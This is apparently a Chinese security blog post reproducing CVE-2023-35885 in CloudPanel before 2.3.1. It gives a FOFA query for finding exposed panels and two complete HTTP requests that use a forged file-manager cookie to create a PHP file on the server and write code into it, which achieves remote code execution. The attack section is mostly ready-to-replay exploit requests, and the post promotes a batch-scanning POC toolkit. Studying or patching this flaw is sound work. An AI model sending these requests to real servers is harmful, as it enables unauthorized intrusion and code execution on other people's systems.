#  CloudPanel makefile接口存在远程命令执行漏洞CVE-2023-35885 附POC软件   
南风徐来  南风漏洞复现文库   2024-01-20 21:04  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
**大家关注一下我的另外一个公众号，这个公众号也会发POC，两个公众号发的漏洞不一样，基本每天更新。**  
  
  
****## 1. CloudPanel 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
CloudPanel 是一个基于 Web 的控制面板或管理界面，旨在简化云托管环境的管理。它提供了一个集中式平台，用于管理云基础架构的各个方面，包括 （VM）、存储、网络和应用程序。  
## 2.漏洞描述  
  
CloudPanel是CloudPanel开源的一款免费软件。用于配置和管理服务器。CloudPanel 2.3.1之前版本存在安全漏洞，该漏洞源于具有不安全的文件管理器cookie身份验证。  
  
CVE编号:CVE-2023-35885  
  
CNNVD编号:CNNVD-202306-1507  
  
CNVD编号:  
## 3.影响版本  
  
CloudPanel 2.3.1之前版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7NcQCwUFmxwRLCibsjyuicnmXR1XdJFGTzPWMtuMC8vPfMVZpMiciaCdBlQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
CloudPanel file-manager/backend/makefile接口存在远程命令执行漏洞  
## 4.fofa查询语句  
  
title=="CloudPanel | Log In"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/file-manager/backend/makefile  
  
漏洞数据包：  
```
POST /file-manager/backend/makefile HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
Content-Length: 44
Content-Type: application/x-www-form-urlencoded

id=/htdocs/app/files/public/&name=180015.php
```  
  
创建文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7XW3FBYJia3QtccoVrib7yc9MXibLibYKT6RyUVd7Xx9yibceSQa2gicfFc0g/640?wx_fmt=jpeg&from=appmsg "null")  
```
POST /file-manager/backend/text HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
Content-Length: 85
Content-Type: application/x-www-form-urlencoded

id=/htdocs/app/files/public/180015.php&content=<?php echo '180015';unlink(__FILE__)?>
```  
  
写内容进文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7XW3FBYJia3QtccoVrib7yc9MXibLibYKT6RyUVd7Xx9yibceSQa2gicfFc0g/640?wx_fmt=jpeg&from=appmsg "null")  
  
文件路径：https://127.0.0.1/180015.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7GqmA51diaCOLr1AwgIuplpr4fPyvnMupXEQqWMZhPw19r6jrwAoxWAw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7v82UV9CUSwHDArN3ANRVNk2icCgrPnqb6f8g28UAVtnpZ8lOc1eoh2A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7GHTovFN6hLSkFwHpdQVIColLibToJP3ehlDeyw2nHYp1dLb6D4Zgiclw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7vkRhZshyT08eXyA6mI2ibfW6eDdLvT6xYwSxaxPa3qnnz3Z5gHhXdZA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7FZNqBibb5qhibwrdozxC15LxtAibyj1cnH3FnrWRYVHAng2sy2TgaKxPQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y2GicFric6jjZ4kBGApicjMr7cryxGn1tFmYssiaXhjhG15pKDnVegAASib3u3rYzHic8WVJhtmpR14Oqg/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
官方补丁 https://www.cloudpanel.io/docs/v2/changelog/  
## 8.往期回顾  
  
[Yearning存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485110&idx=1&sn=2d81d412f8eb45bae8aa6ce52cf991f2&chksm=974b8bb1a03c02a71a12d47e92d4f29eb599caa2f22f9806c38b1274d7f6e878e3e812d3c392&scene=21#wechat_redirect)  
  
  
[likeshop开源免费商用电商系统存在任意文件上传漏洞CVE-2024-0352 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485089&idx=1&sn=098ab0fe5a8747c013dd96a6e8c0279a&chksm=974b8ba6a03c02b0db9d39ed9270754a8adf4d747b129b4fa1b17662e7e2744ce835966c20a5&scene=21#wechat_redirect)  
  
  
  
  
